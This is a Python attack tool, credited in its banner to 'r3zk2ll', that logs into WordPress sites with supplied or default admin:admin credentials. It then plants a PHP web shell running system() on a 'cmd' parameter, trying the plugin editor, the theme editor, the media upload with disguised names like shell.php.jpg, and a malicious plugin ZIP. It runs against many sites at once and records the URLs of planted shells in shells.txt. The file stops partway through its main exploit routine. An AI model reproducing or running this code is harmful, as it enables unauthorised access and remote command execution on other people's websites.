#!/usr/bin/env python3

import requests
import re
import sys
import time
import os
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f'''
    {Colors.RED}██████╗ ██████╗ ███████╗██╗  ██╗██████╗ ██╗     ██╗     
    {Colors.RED}██╔══██╗╚════██╗███████║██║ ██╔╝╚════██╗██║     ██║     
    {Colors.RED}██████╔╝ █████╔╝╚════██║█████╔╝  █████╔╝██║     ██║     
    {Colors.RED}██╔══██╗ ╚═══██╗     ██║██╔═██╗  ╚═══██╗██║     ██║     
    {Colors.RED}██║  ██║██████╔╝███████║██║  ██╗██████╔╝███████╗███████╗
    {Colors.RED}╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
    {Colors.YELLOW}WordPress Auto Login & Shell Uploader{Colors.ENDC}
    {Colors.CYAN}Coded by r3zk2ll{Colors.ENDC}
    '''
    print(banner)

class WordPressExploit:
    def __init__(self, timeout=15):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        # Disable SSL verification for problematic sites
        self.session.verify = False
        self.shell_content = '''
<?php
// r3zk2ll shell
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
elseif(isset($_POST['cmd'])){
    system($_POST['cmd']);
}
elseif(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
else{
    echo "<form method='post'><input type='text' name='cmd'><input type='submit' value='Execute'></form>";
}
?>
'''
        self.txt_content = "r3zk2ll was here\n"
        self.html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>r3zk2ll was here</title>
</head>
<body>
    <h1>r3zk2ll was here</h1>
    <?php
    // r3zk2ll shell
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
    elseif(isset($_POST['cmd'])){
        system($_POST['cmd']);
    }
    elseif(isset($_REQUEST['cmd'])){
        system($_REQUEST['cmd']);
    }
    else{
        echo "<form method='post'><input type='text' name='cmd'><input type='submit' value='Execute'></form>";
    }
    ?>
</body>
</html>
'''
        # File to store failed login details
        self.failed_logins_file = 'manually.txt'

    def normalize_url(self, url):
        """Ensure URL has a scheme and no trailing slash"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def get_login_url(self, base_url):
        """Get WordPress login URL"""
        return urljoin(base_url, '/wp-login.php')

    def get_admin_url(self, base_url):
        """Get WordPress admin URL"""
        return urljoin(base_url, '/wp-admin/')

    def check_wordpress(self, url):
        """Check if the site is running WordPress"""
        try:
            # First try the login URL
            login_url = self.get_login_url(url)
            try:
                response = self.session.get(login_url, timeout=self.timeout, verify=False)
                if 'wp-login' in response.text.lower() or 'wordpress' in response.text.lower():
                    return True
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error checking login page at {url}: {str(e)}{Colors.ENDC}")
                
            # If login page check fails, try the main URL for WordPress indicators
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                wp_indicators = ['wp-content', 'wp-includes', 'wordpress', 'wp-json']
                for indicator in wp_indicators:
                    if indicator in response.text.lower():
                        print(f"{Colors.BLUE}[+] WordPress indicator '{indicator}' found at {url}{Colors.ENDC}")
                        return True
            except Exception as e:
                print(f"{Colors.RED}[!] Error checking main page at {url}: {str(e)}{Colors.ENDC}")
                
            return False
        except Exception as e:
            print(f"{Colors.RED}[!] Error in WordPress check for {url}: {str(e)}{Colors.ENDC}")
            return False

    def login(self, url, username, password):
        """Login to WordPress admin"""
        login_url = self.get_login_url(url)
        try:
            # First request to get cookies and login form
            try:
                response = self.session.get(login_url, timeout=self.timeout, verify=False)
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error getting login page at {url}: {str(e)}{Colors.ENDC}")
                return False
                
            # Extract login nonce if present
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
            nonce = nonce_match.group(1) if nonce_match else ''
            
            # Also look for login redirect field
            redirect_match = re.search(r'name="redirect_to"\s+value="([^"]+)"', response.text)
            redirect_to = redirect_match.group(1) if redirect_match else self.get_admin_url(url)
            
            # Prepare login data
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': redirect_to,
                'testcookie': '1'
            }
            
            if nonce:
                login_data['_wpnonce'] = nonce
            
            # Set cookies that might be expected
            self.session.cookies.set('wordpress_test_cookie', 'WP Cookie check')
            
            # Perform login
            try:
                login_response = self.session.post(
                    login_url, 
                    data=login_data, 
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            except Exception as e:
                print(f"{Colors.RED}[!] Error during login POST at {url}: {str(e)}{Colors.ENDC}")
                return False
            
            # Check if login was successful
            success_indicators = [
                'wp-admin' in login_response.url and 'login' not in login_response.url,
                'dashboard' in login_response.url,
                'admin-ajax.php' in login_response.text,
                'wp-admin/profile.php' in login_response.text,
                'admin-bar' in login_response.text and 'logout' in login_response.text.lower()
            ]
            
            if any(success_indicators):
                print(f"{Colors.GREEN}[+] Successfully logged in to {url} with {username}:{password}{Colors.ENDC}")
                
                # Verify admin access by checking admin page
                try:
                    admin_response = self.session.get(
                        self.get_admin_url(url),
                        timeout=self.timeout,
                        verify=False
                    )
                    if admin_response.status_code == 200 and 'wp-admin' in admin_response.url:
                        print(f"{Colors.GREEN}[+] Confirmed admin access at {url}{Colors.ENDC}")
                        print(f"{Colors.BLUE}[*] DEBUG: Login successful, returning True{Colors.ENDC}")
                    else:
                        print(f"{Colors.YELLOW}[!] Login successful but admin access not confirmed at {url}{Colors.ENDC}")
                        print(f"{Colors.BLUE}[*] DEBUG: Login successful but admin access not confirmed, still returning True{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error checking admin access at {url}: {str(e)}{Colors.ENDC}")
                    print(f"{Colors.BLUE}[*] DEBUG: Error checking admin access, still returning True{Colors.ENDC}")
                
                return True
            else:
                print(f"{Colors.YELLOW}[-] Failed to login to {url} with {username}:{password}{Colors.ENDC}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error during login process at {url}: {str(e)}{Colors.ENDC}")
            return False

    def upload_shell_via_plugin(self, url):
        """Upload shell via plugin editor"""
        try:
            plugin_editor_url = urljoin(self.get_admin_url(url), 'plugin-editor.php')
            print(f"{Colors.BLUE}[*] Trying to access plugin editor at {plugin_editor_url}{Colors.ENDC}")
            response = self.session.get(plugin_editor_url, timeout=self.timeout, verify=False)
            
            # Check if we have access to plugin editor
            if 'Plugin Editor' not in response.text and 'Plugin File Editor' not in response.text:
                print(f"{Colors.YELLOW}[-] No access to plugin editor at {url}{Colors.ENDC}")
                # Try alternative approach - check for plugins menu
                plugins_url = urljoin(self.get_admin_url(url), 'plugins.php')
                print(f"{Colors.BLUE}[*] Trying to access plugins page at {plugins_url}{Colors.ENDC}")
                response = self.session.get(plugins_url, timeout=self.timeout, verify=False)
                
                # Look for plugin editor link
                editor_match = re.search(r'href=["\']([^"\'\']+plugin-editor\.php[^"\'\']*)["\']', response.text)
                if editor_match:
                    editor_url = editor_match.group(1).replace('&amp;', '&')
                    plugin_editor_url = urljoin(url, editor_url)
                    print(f"{Colors.BLUE}[*] Found plugin editor link at {plugin_editor_url}{Colors.ENDC}")
                    response = self.session.get(plugin_editor_url, timeout=self.timeout, verify=False)
                else:
                    return False
            
            # Extract plugin and nonce
            plugin_match = re.search(r'plugin=([^&"]+)', response.text)
            plugin = plugin_match.group(1) if plugin_match else ''
            
            if not plugin:
                # Try to find the active plugin
                plugin_match = re.search(r'<option value="([^"]+)"[^>]*selected', response.text)
                plugin = plugin_match.group(1) if plugin_match else ''
                
                if not plugin:
                    # Try to find any plugin in the dropdown
                    plugin_match = re.search(r'<option value="([^"]+)"', response.text)
                    plugin = plugin_match.group(1) if plugin_match else ''
                    
                    if not plugin:
                        print(f"{Colors.YELLOW}[-] Could not determine any plugin at {url}{Colors.ENDC}")
                        return False
                    print(f"{Colors.BLUE}[*] Using first available plugin: {plugin}{Colors.ENDC}")
            
            print(f"{Colors.BLUE}[*] Using plugin: {plugin}{Colors.ENDC}")
            
            # Try different file types
            file_types = [
                {'name': 'shell.php', 'content': self.shell_content},
                {'name': 'r3z.php', 'content': self.shell_content},
                {'name': 'r3z.txt', 'content': self.txt_content},
                {'name': 'r3z.html', 'content': self.html_content}
            ]
            
            for file_type in file_types:
                print(f"{Colors.BLUE}[*] Trying to upload {file_type['name']} to plugin {plugin}{Colors.ENDC}")
                # Get the plugin file
                plugin_file_url = urljoin(self.get_admin_url(url), f'plugin-editor.php?file={plugin}/{file_type["name"]}&plugin={plugin}')
                response = self.session.get(plugin_file_url, timeout=self.timeout, verify=False)
                
                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
                nonce = nonce_match.group(1) if nonce_match else ''
                
                if not nonce:
                    print(f"{Colors.YELLOW}[-] Could not extract nonce for plugin editor at {url}{Colors.ENDC}")
                    # Try to find any nonce in the page
                    nonce_match = re.search(r'name="([^"]+nonce[^"]*?)"\s+value="([^"]+)"', response.text)
                    if nonce_match:
                        nonce_name = nonce_match.group(1)
                        nonce = nonce_match.group(2)
                        print(f"{Colors.BLUE}[*] Found alternative nonce: {nonce_name}={nonce}{Colors.ENDC}")
                    else:
                        continue
                
                # Submit the content
                data = {
                    '_wpnonce': nonce,
                    'newcontent': file_type['content'],
                    'action': 'update',
                    'file': f'{plugin}/{file_type["name"]}',
                    'plugin': plugin,
                    'submit': 'Update File'
                }
                
                print(f"{Colors.BLUE}[*] Submitting file content to {plugin_file_url}{Colors.ENDC}")
                edit_response = self.session.post(
                    plugin_file_url,
                    data=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check if edit was successful
                success_indicators = [
                    'File edited successfully' in edit_response.text,
                    'successfully updated' in edit_response.text.lower(),
                    'file saved' in edit_response.text.lower()
                ]
                
                if any(success_indicators):
                    file_url = urljoin(url, f'/wp-content/plugins/{plugin}/{file_type["name"]}')
                    print(f"{Colors.GREEN}[+] File uploaded successfully via plugin editor at {file_url}{Colors.ENDC}")
                    
                    # Save successful shell to file
                    with open('shells.txt', 'a') as f:
                        f.write(f"{file_url}\n")
                        
                    return True
                else:
                    print(f"{Colors.YELLOW}[-] Failed to upload {file_type['name']} via plugin editor{Colors.ENDC}")
                    # Try to check if the file was created anyway
                    file_url = urljoin(url, f'/wp-content/plugins/{plugin}/{file_type["name"]}')
                    try:
                        check_response = self.session.get(file_url, timeout=self.timeout, verify=False)
                        if check_response.status_code == 200:
                            print(f"{Colors.GREEN}[+] File exists at {file_url} despite no success message{Colors.ENDC}")
                            # Save successful shell to file
                            with open('shells.txt', 'a') as f:
                                f.write(f"{file_url} (unconfirmed)\n")
                            return True
                    except Exception as e:
                        print(f"{Colors.YELLOW}[!] Error checking file existence: {str(e)}{Colors.ENDC}")
            
            print(f"{Colors.YELLOW}[-] Failed to upload any files via plugin editor at {url}{Colors.ENDC}")
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error uploading via plugin editor at {url}: {str(e)}{Colors.ENDC}")
            return False

    def upload_shell_via_theme_editor(self, url):
        """Upload shell via theme editor"""
        try:
            theme_editor_url = urljoin(self.get_admin_url(url), 'theme-editor.php')
            print(f"{Colors.BLUE}[*] Trying to access theme editor at {theme_editor_url}{Colors.ENDC}")
            response = self.session.get(theme_editor_url, timeout=self.timeout, verify=False)
            
            # Check if we have access to theme editor
            if 'Theme Editor' not in response.text and 'Theme File Editor' not in response.text:
                print(f"{Colors.YELLOW}[-] No access to theme editor at {url}{Colors.ENDC}")
                # Try alternative approach - check for appearance menu
                appearance_url = urljoin(self.get_admin_url(url), 'themes.php')
                print(f"{Colors.BLUE}[*] Trying to access themes page at {appearance_url}{Colors.ENDC}")
                response = self.session.get(appearance_url, timeout=self.timeout, verify=False)
                
                # Look for theme editor link
                editor_match = re.search(r'href=["\']([^"\']+theme-editor\.php[^"\']*)["\']', response.text)
                if editor_match:
                    editor_url = editor_match.group(1).replace('&amp;', '&')
                    theme_editor_url = urljoin(url, editor_url)
                    print(f"{Colors.BLUE}[*] Found theme editor link at {theme_editor_url}{Colors.ENDC}")
                    response = self.session.get(theme_editor_url, timeout=self.timeout, verify=False)
                else:
                    return False
            
            # Extract current theme and nonce
            theme_match = re.search(r'theme=([^&"]+)', response.text)
            theme = theme_match.group(1) if theme_match else ''
            
            if not theme:
                # Try to find the active theme
                theme_match = re.search(r'<option value="([^"]+)"[^>]*selected', response.text)
                theme = theme_match.group(1) if theme_match else ''
                
                # If still no theme, try to find it in the page content
                if not theme:
                    theme_match = re.search(r'current theme is ([^<]+)', response.text, re.IGNORECASE)
                    if theme_match:
                        theme = theme_match.group(1).strip().lower().replace(' ', '-')
                    else:
                        # Try to find any theme name in the URL or page
                        theme_match = re.search(r'theme=([^&"]+)', response.url)
                        theme = theme_match.group(1) if theme_match else ''
                
                if not theme:
                    print(f"{Colors.YELLOW}[-] Could not determine active theme at {url}{Colors.ENDC}")
                    # Try to find any theme name in the dropdown
                    theme_match = re.search(r'<option value="([^"]+)"', response.text)
                    theme = theme_match.group(1) if theme_match else ''
                    if not theme:
                        return False
                    print(f"{Colors.BLUE}[*] Using first available theme: {theme}{Colors.ENDC}")
            
            print(f"{Colors.BLUE}[*] Using theme: {theme}{Colors.ENDC}")
            
            # Try different file types
            file_types = [
                {'name': 'shell.php', 'content': self.shell_content},
                {'name': 'r3z.php', 'content': self.shell_content},
                {'name': 'r3z.txt', 'content': self.txt_content}
            ]
            
            for file_type in file_types:
                print(f"{Colors.BLUE}[*] Trying to upload {file_type['name']} to theme {theme}{Colors.ENDC}")
                # Create a new file in the theme
                new_file_url = urljoin(self.get_admin_url(url), f'theme-editor.php?file={file_type["name"]}&theme={theme}')
                response = self.session.get(new_file_url, timeout=self.timeout, verify=False)
                
                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
                nonce = nonce_match.group(1) if nonce_match else ''
                
                if not nonce:
                    print(f"{Colors.YELLOW}[-] Could not extract nonce for theme editor at {url}{Colors.ENDC}")
                    # Try to find any nonce in the page
                    nonce_match = re.search(r'name="([^"]+nonce[^"]*?)"\s+value="([^"]+)"', response.text)
                    if nonce_match:
                        nonce_name = nonce_match.group(1)
                        nonce = nonce_match.group(2)
                        print(f"{Colors.BLUE}[*] Found alternative nonce: {nonce_name}={nonce}{Colors.ENDC}")
                    else:
                        continue
                
                # Submit the content
                data = {
                    '_wpnonce': nonce,
                    'newcontent': file_type['content'],
                    'action': 'update',
                    'file': file_type['name'],
                    'theme': theme,
                    'submit': 'Update File'
                }
                
                print(f"{Colors.BLUE}[*] Submitting file content to {new_file_url}{Colors.ENDC}")
                edit_response = self.session.post(
                    new_file_url,
                    data=data,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check if edit was successful
                success_indicators = [
                    'File edited successfully' in edit_response.text,
                    'successfully updated' in edit_response.text.lower(),
                    'file saved' in edit_response.text.lower()
                ]
                
                if any(success_indicators):
                    file_url = urljoin(url, f'/wp-content/themes/{theme}/{file_type["name"]}')
                    print(f"{Colors.GREEN}[+] File uploaded successfully via theme editor at {file_url}{Colors.ENDC}")
                    
                    # Save successful shell to file
                    with open('shells.txt', 'a') as f:
                        f.write(f"{file_url}\n")
                        
                    return True
                else:
                    print(f"{Colors.YELLOW}[-] Failed to upload {file_type['name']} via theme editor{Colors.ENDC}")
                    # Try to check if the file was created anyway
                    file_url = urljoin(url, f'/wp-content/themes/{theme}/{file_type["name"]}')
                    try:
                        check_response = self.session.get(file_url, timeout=self.timeout, verify=False)
                        if check_response.status_code == 200:
                            print(f"{Colors.GREEN}[+] File exists at {file_url} despite no success message{Colors.ENDC}")
                            # Save successful shell to file
                            with open('shells.txt', 'a') as f:
                                f.write(f"{file_url} (unconfirmed)\n")
                            return True
                    except Exception as e:
                        print(f"{Colors.YELLOW}[!] Error checking file existence: {str(e)}{Colors.ENDC}")
            
            print(f"{Colors.YELLOW}[-] Failed to upload any files via theme editor at {url}{Colors.ENDC}")
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error uploading via theme editor at {url}: {str(e)}{Colors.ENDC}")
            return False

    def upload_shell_via_media(self, url):
        """Upload shell via media uploader"""
        try:
            media_url = urljoin(self.get_admin_url(url), 'media-new.php')
            print(f"{Colors.BLUE}[*] Trying to access media uploader at {media_url}{Colors.ENDC}")
            response = self.session.get(media_url, timeout=self.timeout, verify=False)
            
            # Check if we have access to media uploader
            if 'Upload New Media' not in response.text and 'Add New Media' not in response.text:
                print(f"{Colors.YELLOW}[-] No access to media uploader at {url}{Colors.ENDC}")
                # Try alternative media page
                alt_media_url = urljoin(self.get_admin_url(url), 'upload.php')
                print(f"{Colors.BLUE}[*] Trying alternative media page at {alt_media_url}{Colors.ENDC}")
                response = self.session.get(alt_media_url, timeout=self.timeout, verify=False)
                if 'Add New' not in response.text:
                    return False
                # Try to get to the upload page from here
                add_new_match = re.search(r'href=["\']([^"\']+)["\'][^>]*>Add New', response.text)
                if add_new_match:
                    add_new_url = add_new_match.group(1)
                    add_new_url = add_new_url.replace('&amp;', '&')
                    media_url = urljoin(url, add_new_url)
                    print(f"{Colors.BLUE}[*] Found Add New link at {media_url}{Colors.ENDC}")
                    response = self.session.get(media_url, timeout=self.timeout, verify=False)
                else:
                    return False
            
            # Extract nonce from the form
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
            if not nonce_match:
                # Try to find plupload nonce
                plupload_match = re.search(r'_wpPluploadSettings[^{]+(\{[^}]+\})', response.text)
                if plupload_match:
                    try:
                        import json
                        plupload_settings = json.loads(plupload_match.group(1))
                        nonce = plupload_settings.get('nonce', '')
                        print(f"{Colors.BLUE}[*] Found plupload nonce: {nonce}{Colors.ENDC}")
                    except:
                        nonce = ''
                else:
                    nonce = ''
            else:
                nonce = nonce_match.group(1)
                print(f"{Colors.BLUE}[*] Found form nonce: {nonce}{Colors.ENDC}")
            
            # Try different file types
            file_types = [
                {'name': 'shell.php.jpg', 'content': self.shell_content, 'mime': 'image/jpeg'},
                {'name': 'r3z.php.jpg', 'content': self.shell_content, 'mime': 'image/jpeg'},
                {'name': 'r3z.jpeg', 'content': self.shell_content, 'mime': 'image/jpeg'},
                {'name': 'r3z.txt', 'content': self.txt_content, 'mime': 'text/plain'},
                {'name': 'r3z.html', 'content': self.html_content, 'mime': 'text/html'}
            ]
            
            for file_type in file_types:
                print(f"{Colors.BLUE}[*] Trying to upload {file_type['name']}{Colors.ENDC}")
                # Create temporary file
                with open(file_type['name'], 'w') as f:
                    f.write(file_type['content'])
                
                # Upload the file
                files = {'async-upload': (file_type['name'], open(file_type['name'], 'rb'), file_type['mime'])}
                data = {'_wpnonce': nonce, 'action': 'upload-attachment'}
                
                upload_url = urljoin(url, '/wp-admin/async-upload.php')
                print(f"{Colors.BLUE}[*] Uploading to {upload_url}{Colors.ENDC}")
                upload_response = self.session.post(
                    upload_url,
                    files=files,
                    data=data,
                    timeout=self.timeout,
                    verify=False
                )
                
                # Clean up temporary file
                os.remove(file_type['name'])
                
                # Check if upload was successful
                print(f"{Colors.BLUE}[*] Upload response status: {upload_response.status_code}{Colors.ENDC}")
                if upload_response.status_code == 200:
                    print(f"{Colors.BLUE}[*] Upload response content: {upload_response.text[:100]}...{Colors.ENDC}")
                    try:
                        response_data = upload_response.json()
                        if 'success' in response_data and response_data['success']:
                            attachment_id = response_data.get('data', {}).get('id', '')
                            if attachment_id:
                                print(f"{Colors.GREEN}[+] File uploaded successfully with ID: {attachment_id}{Colors.ENDC}")
                                # Try to get the attachment URL
                                try:
                                    # First try to get the URL from the response
                                    attachment_url = response_data.get('data', {}).get('url', '')
                                    if not attachment_url:
                                        # If not in response, construct it based on common WordPress structure
                                        attachment_url = urljoin(url, f'/wp-content/uploads/{time.strftime("%Y/%m")}/{file_type["name"]}')
                                    
                                    print(f"{Colors.GREEN}[+] File uploaded successfully via media at {attachment_url}{Colors.ENDC}")
                                    
                                    # Save successful shell to file
                                    with open('shells.txt', 'a') as f:
                                        f.write(f"{attachment_url}\n")
                                        
                                    return True
                                except Exception as e:
                                    print(f"{Colors.YELLOW}[!] Error getting attachment URL: {str(e)}{Colors.ENDC}")
                    except Exception as e:
                        print(f"{Colors.YELLOW}[!] Error parsing upload response: {str(e)}{Colors.ENDC}")
                        # Even if JSON parsing fails, try to check if upload was successful
                        if 'id' in upload_response.text and ('success' in upload_response.text or 'file' in upload_response.text):
                            # Try to extract the URL or ID from the response text
                            url_match = re.search(r'"url":"([^"]+)"', upload_response.text)
                            if url_match:
                                attachment_url = url_match.group(1).replace('\\', '')
                                print(f"{Colors.GREEN}[+] File uploaded successfully via media at {attachment_url}{Colors.ENDC}")
                                
                                # Save successful shell to file
                                with open('shells.txt', 'a') as f:
                                    f.write(f"{attachment_url}\n")
                                    
                                return True
                            else:
                                # Construct URL based on common WordPress structure
                                attachment_url = urljoin(url, f'/wp-content/uploads/{time.strftime("%Y/%m")}/{file_type["name"]}')
                                print(f"{Colors.GREEN}[+] File possibly uploaded via media at {attachment_url}{Colors.ENDC}")
                                
                                # Save potential shell to file
                                with open('shells.txt', 'a') as f:
                                    f.write(f"{attachment_url} (unconfirmed)\n")
                                    
                                return True
            
            print(f"{Colors.YELLOW}[-] Failed to upload any files via media at {url}{Colors.ENDC}")
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error uploading via media at {url}: {str(e)}{Colors.ENDC}")
            return False

    def upload_shell_via_plugin_upload(self, url):
        """Upload shell via plugin upload feature"""
        print(f"{Colors.BLUE}[*] DEBUG: Inside upload_shell_via_plugin_upload method for {url}{Colors.ENDC}")
        try:
            # Path to the plugin file we created
            plugin_file = 'upload_plugin_shell.php'
            plugin_zip = 'wordpress_file_manager.zip'
            
            # Check if the plugin file exists
            if not os.path.exists(plugin_file):
                print(f"{Colors.RED}[!] Plugin file {plugin_file} not found{Colors.ENDC}")
                return False
                
            # Create a ZIP file containing the plugin
            import zipfile
            with zipfile.ZipFile(plugin_zip, 'w') as zipf:
                zipf.write(plugin_file, arcname='wordpress-file-manager/wordpress-file-manager.php')
            
            print(f"{Colors.BLUE}[*] Created plugin ZIP file: {plugin_zip}{Colors.ENDC}")
            
            # Access the plugin upload page
            plugin_upload_url = urljoin(self.get_admin_url(url), 'plugin-install.php?tab=upload')
            print(f"{Colors.BLUE}[*] Accessing plugin upload page at {plugin_upload_url}{Colors.ENDC}")
            response = self.session.get(plugin_upload_url, timeout=self.timeout, verify=False)
            
            # Check if we have access to plugin upload
            if 'Upload Plugin' not in response.text and 'plugin-upload' not in response.text:
                print(f"{Colors.YELLOW}[-] No access to plugin upload at {url}{Colors.ENDC}")
                return False
            
            # Extract nonce from the form
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
            if not nonce_match:
                print(f"{Colors.YELLOW}[-] Could not extract nonce for plugin upload at {url}{Colors.ENDC}")
                return False
                
            nonce = nonce_match.group(1)
            print(f"{Colors.BLUE}[*] Found plugin upload nonce: {nonce}{Colors.ENDC}")
            
            # Upload the plugin ZIP file
            files = {'pluginzip': (plugin_zip, open(plugin_zip, 'rb'), 'application/zip')}
            data = {'_wpnonce': nonce, 'install-plugin-submit': 'Install Now'}
            
            print(f"{Colors.BLUE}[*] Uploading plugin ZIP file to {plugin_upload_url}{Colors.ENDC}")
            upload_response = self.session.post(
                plugin_upload_url,
                files=files,
                data=data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            # Clean up temporary files
            try:
                os.remove(plugin_zip)
                print(f"{Colors.BLUE}[*] Removed temporary ZIP file{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error removing temporary ZIP file: {str(e)}{Colors.ENDC}")
            
            # Check if upload was successful
            success_indicators = [
                'Plugin installed successfully' in upload_response.text,
                'Successfully installed' in upload_response.text,
                'Plugin activated successfully' in upload_response.text
            ]
            
            if any(success_indicators):
                # Construct the URL to the uploaded shell
                shell_url = urljoin(url, '/wp-content/plugins/wordpress-file-manager/wordpress-file-manager.php')
                print(f"{Colors.GREEN}[+] Plugin uploaded successfully. Shell should be at: {shell_url}{Colors.ENDC}")
                
                # Verify the shell exists
                try:
                    verify_response = self.session.get(shell_url, timeout=self.timeout, verify=False)
                    if verify_response.status_code == 200:
                        print(f"{Colors.GREEN}[+] Shell confirmed at {shell_url}{Colors.ENDC}")
                        # Save successful shell to file
                        with open('shells.txt', 'a') as f:
                            f.write(f"{shell_url}\n")
                        return True
                    else:
                        print(f"{Colors.YELLOW}[!] Shell upload appeared successful but could not verify at {shell_url}{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error verifying shell: {str(e)}{Colors.ENDC}")
            
            # Try alternative method - direct upload to update.php
            print(f"{Colors.BLUE}[*] Trying alternative plugin upload method via update.php{Colors.ENDC}")
            update_url = urljoin(self.get_admin_url(url), 'update.php?action=upload-plugin')
            
            # Get the update.php page to extract nonce
            response = self.session.get(update_url, timeout=self.timeout, verify=False)
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', response.text)
            if not nonce_match:
                print(f"{Colors.YELLOW}[-] Could not extract nonce for update.php at {url}{Colors.ENDC}")
                return False
                
            nonce = nonce_match.group(1)
            print(f"{Colors.BLUE}[*] Found update.php nonce: {nonce}{Colors.ENDC}")
            
            # Create a new ZIP file
            with zipfile.ZipFile(plugin_zip, 'w') as zipf:
                zipf.write(plugin_file, arcname='wordpress-file-manager/wordpress-file-manager.php')
            
            # Upload the plugin ZIP file via update.php
            files = {'pluginzip': (plugin_zip, open(plugin_zip, 'rb'), 'application/zip')}
            data = {'_wpnonce': nonce, 'install-plugin-submit': 'Install Now'}
            
            print(f"{Colors.BLUE}[*] Uploading plugin ZIP file to {update_url}{Colors.ENDC}")
            upload_response = self.session.post(
                update_url,
                files=files,
                data=data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            # Clean up temporary files again
            try:
                os.remove(plugin_zip)
            except Exception:
                pass
            
            # Check if upload was successful
            success_indicators = [
                'Plugin installed successfully' in upload_response.text,
                'Successfully installed' in upload_response.text,
                'Plugin activated successfully' in upload_response.text
            ]
            
            if any(success_indicators):
                # Construct the URL to the uploaded shell
                shell_url = urljoin(url, '/wp-content/plugins/wordpress-file-manager/wordpress-file-manager.php')
                print(f"{Colors.GREEN}[+] Plugin uploaded successfully via update.php. Shell should be at: {shell_url}{Colors.ENDC}")
                
                # Verify the shell exists
                try:
                    verify_response = self.session.get(shell_url, timeout=self.timeout, verify=False)
                    if verify_response.status_code == 200:
                        print(f"{Colors.GREEN}[+] Shell confirmed at {shell_url}{Colors.ENDC}")
                        # Save successful shell to file
                        with open('shells.txt', 'a') as f:
                            f.write(f"{shell_url}\n")
                        return True
                    else:
                        print(f"{Colors.YELLOW}[!] Shell upload appeared successful but could not verify at {shell_url}{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error verifying shell: {str(e)}{Colors.ENDC}")
            
            print(f"{Colors.YELLOW}[-] Failed to upload plugin shell at {url}{Colors.ENDC}")
            return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error uploading plugin shell at {url}: {str(e)}{Colors.ENDC}")
            return False

    def exploit(self, url_entry):
        """Main exploit function"""
        # Parse URL and credentials from the entry
        url_entry = url_entry.strip()
        parts = url_entry.split('#')
        
        if len(parts) == 2:
            url = self.normalize_url(parts[0])
            creds_part = parts[1]
            
            # Handle special case where @ is in username (email address)
            if creds_part.count('@') > 1:
                # Find the last @ which separates username and password
                last_at_index = creds_part.rindex('@')
                username = creds_part[:last_at_index]
                password = creds_part[last_at_index+1:]
            elif creds_part.count('@') == 1:
                username, password = creds_part.split('@')
            else:
                print(f"{Colors.YELLOW}[!] Invalid credential format in {url_entry}, using default admin:admin{Colors.ENDC}")
                username, password = 'admin', 'admin'
                
            print(f"{Colors.BLUE}[*] Extracted credentials - Username: {username}, Password: {password}{Colors.ENDC}")
        else:
            url = self.normalize_url(url_entry)
            print(f"{Colors.YELLOW}[!] No credentials provided for {url}, using default admin:admin{Colors.ENDC}")
            username, password = 'admin', 'admin'
            
        # Check if URL already has wp-login.php, if not, try to find it
        original_url = url
        if 'wp-login.php' not in url:
            # Try common WordPress login paths
            wp_login_paths = [
                '/wp-login.php',
                '/wordpress/wp-login.php',
                '/blog/wp-login.php',
                '/wp/wp-login.php',
                '/cms/wp-login.php',
                '/site/wp-login.php',
                '/members/wp-login.php',
                '/login/wp-login.php'
            ]
            
            # First check if the base URL is accessible
            try:
                self.session.get(url, timeout=self.timeout, verify=False)
            except Exception as e:
                print(f"{Colors.RED}[!] Error accessing base URL {url}: {str(e)}{Colors.ENDC}")
                return False
                
            # Try each login path
            login_found = False
            for path in wp_login_paths:
                test_url = url.rstrip('/') + path
                try:
                    print(f"{Colors.BLUE}[*] Trying login path: {test_url}{Colors.ENDC}")
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if response.status_code == 200 and ('wp-login' in response.text.lower() or 'wordpress' in response.text.lower()):
                        url = test_url
